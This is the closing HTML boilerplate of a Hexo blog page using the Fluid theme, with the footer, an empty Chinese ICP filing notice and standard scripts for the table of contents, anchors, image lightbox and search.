       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
    </div>
  
  
  
    <!-- 备案信息 ICP for China -->
    <div class="beian">
  <span>
    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
      
    </a>
  </span>
  
</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
